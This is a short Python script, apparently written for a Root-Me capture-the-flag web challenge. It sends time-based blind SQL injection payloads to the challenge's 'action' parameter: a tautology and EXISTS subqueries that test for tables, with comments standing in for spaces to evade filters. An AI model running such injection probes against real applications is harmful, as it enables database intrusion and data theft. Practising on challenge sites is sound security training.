import requests
import time

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

def test_payload(payload):
    params = {"action": payload}
    inicio = time.time()
    r = requests.get(URL, params=params, cookies=COOKIE, timeout=30)
    tiempo = time.time() - inicio
    return tiempo

# Probar diferentes payloads
print("Probando payloads...")

# Baseline
t = test_payload("login")
print(f"Baseline: {t:.2f}s")

# OR 1=1 (debería ser rápido porque no hay heavy query)
t = test_payload("login'/**/OR/**/1=1/**/-- -")
print(f"OR 1=1: {t:.2f}s")

# AND con EXISTS (debería ser lento si la tabla existe)
t = test_payload("login'/**/AND/**/EXISTS(SELECT/**/*/**/FROM/**/users)/**/-- -")
print(f"EXISTS users: {t:.2f}s")

# AND con EXISTS en tabla que no existe (debería ser rápido)
t = test_payload("login'/**/AND/**/EXISTS(SELECT/**/*/**/FROM/**/tabla_que_no_existe)/**/-- -")
print(f"EXISTS fake: {t:.2f}s")
